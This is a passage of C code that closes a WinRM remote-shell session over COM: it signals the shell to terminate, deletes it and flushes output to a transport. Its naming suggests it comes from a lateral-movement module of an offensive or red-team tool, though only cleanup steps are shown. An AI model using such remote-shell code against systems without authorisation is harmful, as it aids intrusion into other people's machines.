        lat_wcat(sigXml, 512,
            L"\" Code=\"http://schemas.microsoft.com/wbem/wsman/1/"
            L"windows/shell/signal/terminate\"/>");

        VARIANT args[4];
        VariantInit(&args[0]); V_VT(&args[0]) = VT_I4;   V_I4(&args[0])   = 0;
        VariantInit(&args[1]); V_VT(&args[1]) = VT_BSTR; V_BSTR(&args[1]) = SysAllocString(sigXml);
        VariantInit(&args[2]); V_VT(&args[2]) = VT_BSTR; V_BSTR(&args[2]) = SysAllocString(shellUriId);
        VariantInit(&args[3]); V_VT(&args[3]) = VT_BSTR; V_BSTR(&args[3]) = SysAllocString(kSignalAction);
        VARIANT vRes;
        lat_dcall(pSess, L"Invoke", DISPATCH_METHOD, args, 4, &vRes);
        SysFreeString(V_BSTR(&args[3]));
        SysFreeString(V_BSTR(&args[2]));
        SysFreeString(V_BSTR(&args[1]));
        VariantClear(&vRes);
    }
    {
        VARIANT args[2];
        VariantInit(&args[0]); V_VT(&args[0]) = VT_I4;   V_I4(&args[0])   = 0;
        VariantInit(&args[1]); V_VT(&args[1]) = VT_BSTR; V_BSTR(&args[1]) = SysAllocString(shellUriId);
        VARIANT vRes;
        lat_dcall(pSess, L"Delete", DISPATCH_METHOD, args, 2, &vRes);
        SysFreeString(V_BSTR(&args[1]));
        VariantClear(&vRes);
    }
    out_flush_chunk(get_transport(), 0);

wrm_done:
    if (bResult) SysFreeString(bResult);
    if (pSess)   pSess->lpVtbl->Release(pSess);
    if (pWsm)    pWsm->lpVtbl->Release(pWsm);
    if (bUninit) CoUninitialize();
}
